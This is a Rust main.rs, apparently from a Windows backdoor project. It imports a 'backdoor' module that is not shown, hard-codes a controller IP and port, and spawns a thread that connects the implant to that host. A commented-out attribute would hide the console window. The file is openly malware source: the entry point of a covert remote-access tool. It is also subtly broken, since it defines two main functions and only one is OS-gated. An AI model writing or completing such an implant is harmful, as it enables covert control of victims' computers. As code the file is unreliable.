//#![windows_subsystem = "windows"]

mod backdoor;

#[cfg(not(target_os = "windows"))]
fn main() 
{
    panic!("This program is only for Windows");
}

fn main() 
{
    use std::thread;
    use backdoor::Backdoor;

    const SERVER_IP: &'static str = "192.168.0.22";
    const SERVER_PORT: &'static str = "1973";

    let my_backdoor = Backdoor::new();

    let handle = thread::spawn(move || {
        my_backdoor.run(&format!("{}:{}", SERVER_IP, SERVER_PORT));
    });

    handle.join().unwrap();
}
